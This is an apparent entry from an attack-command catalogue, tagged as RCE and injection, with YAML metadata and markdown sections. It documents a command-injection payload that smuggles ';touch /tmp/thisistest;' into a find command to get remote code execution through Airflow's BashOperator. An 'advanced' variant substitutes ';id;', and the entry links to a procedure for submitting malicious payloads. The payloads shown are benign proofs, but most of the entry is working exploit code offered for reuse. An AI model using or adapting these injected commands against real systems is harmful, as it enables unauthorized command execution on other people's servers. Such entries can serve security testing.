---
id: cmd-uuid-001
data: find ;touch /tmp/thisistest; -type f -printf "%f\n" | head -1
tags:
  - rce
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.835Z'
verified: false
validated: true
submitted: true
---
# find-directory-with-injected-touch-command

## Command

```bash
find ;touch /tmp/thisistest; -type f -printf "%f\n" | head -1
```

## Description

This command exploits command injection by prepending a 'touch' command via semicolon to the original 'find' utility, which lists the first filename in a directory. It is injected into Airflow's BashOperator to demonstrate RCE, creating a test file while mimicking legitimate output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `;touch /tmp/thisistest;` | Injected command to create a test file for verification | Yes |
| `-type f` | Filters for files only | Yes |
| `-printf "%f\n"` | Prints filename followed by newline | Yes |
| `| head -1` | Limits output to the first match | Yes |

## Examples

### Basic Usage

```bash
find ;touch /tmp/thisistest; -type f -printf "%f\n" | head -1
```

### Advanced Usage

Replace touch with other commands, e.g., ;id; to output user info:

```bash
find ;id; -type f -printf "%f\n" | head -1
```

## Expected Output

The command outputs the first filename from the directory (e.g., a sample file name) and creates /tmp/thisistest on the filesystem. Logs may show both the find result and touch execution.

## Related

- [[Related Procedure: Submit-Malicious-Payload-to-Inject-Commands]]
